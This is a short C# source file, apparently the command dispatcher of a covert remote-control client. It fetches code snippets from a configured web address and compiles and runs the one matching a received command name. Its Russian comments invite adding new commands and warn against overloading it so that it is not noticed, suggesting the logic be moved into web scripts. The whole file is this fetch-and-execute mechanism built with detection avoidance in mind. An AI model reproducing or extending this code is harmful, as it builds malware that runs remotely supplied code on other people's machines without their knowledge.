using System;
using System.Collections.Generic;

namespace Minishion2
{
    internal class Functions
    {
        public static void Func()
        {
            //CMD.ComType - имя команды, можете добавить свою =>
            /*case nameComnad:
             * Console.WriteLine("Ваш меттод , жедательно писать в новом класе и ссылаться на него здесь");
             * break;
             */
            // Сильно не нагружайте, а то палиться очень будет .Лучше в Web скрипты всё это дело перенесите.
            switch (CMD.ComType)
            {

                default:
                    Dictionary<string, string> methods = Web.SendGetMethod(Config.WebContent);
                    if (methods.ContainsKey(CMD.ComType)) {
                        foreach (string nameMethod in methods.Keys)
                        {
                            if (CMD.ComType == nameMethod)
                            {
                                Console.WriteLine(methods[nameMethod]);
                                Compiler.Compilers(methods[nameMethod]);
                            }
                        }
                    }
                break;

            }
        }
    }
}
